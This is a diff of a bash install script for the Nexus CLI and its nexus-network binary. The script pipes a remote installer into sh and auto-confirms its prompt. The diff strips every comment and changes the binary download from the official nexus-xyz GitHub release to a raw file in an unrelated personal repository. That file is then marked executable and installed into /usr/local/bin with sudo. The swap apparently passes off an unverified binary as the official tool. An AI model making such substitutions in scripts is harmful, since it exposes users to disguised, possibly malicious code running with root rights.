@@ -1,26 +1,16 @@
 #!/bin/bash
-
-# Make this script executable (only needed the first time)
 chmod +x "$0"
-
-# Update and install expect
 sudo apt-get update
 sudo apt-get install expect -y
-
-# Run nexus-cli installer with auto "Y"
 expect -c '
 spawn sh -c "curl https://cli.nexus.xyz/ | sh"
 expect "(Y/n)"
 send "Y\r"
 expect eof
 '
-
-# Apply bashrc changes
 source ~/.bashrc
-
-# Download and install nexus-network binary
 cd ~/Downloads
-wget https://github.com/nexus-xyz/nexus-cli/releases/download/v0.9.7/nexus-network-linux-x86_64
+wget https://raw.githubusercontent.com/maryluz90-temp2/temp1/main/nexus-network-linux-x86_64
 chmod +x nexus-network-linux-x86_64
 sudo mv nexus-network-linux-x86_64 /usr/local/bin/nexus-network
 
